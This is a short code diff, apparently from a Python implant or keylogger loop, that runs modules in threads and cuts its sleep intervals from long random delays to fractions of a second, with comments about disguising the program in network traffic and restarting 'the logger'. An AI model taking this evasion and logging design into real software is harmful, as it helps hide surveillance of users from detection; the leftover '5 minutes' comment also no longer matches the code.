@@ -124,9 +124,9 @@ while True:
         for task in config:
             t = threading.Thread(target=module_runner,args=(task['module'],task['time'],))
             t.start()
-            time.sleep(random.randint(100,10000))
-            
+            time.sleep(random.randint(1,2))
+        with task_queue.mutex: task_queue.queue.clear()
     #time.sleep(random.randint(1000,1000000))#dusguise in network, attempt to sleep
     #or generate random trafic to common pages
-    time.sleep(5*60) #sleep for 5 minutes and then start the logger again
+    time.sleep(5*0.1) #sleep for 5 minutes and then start the logger again
         
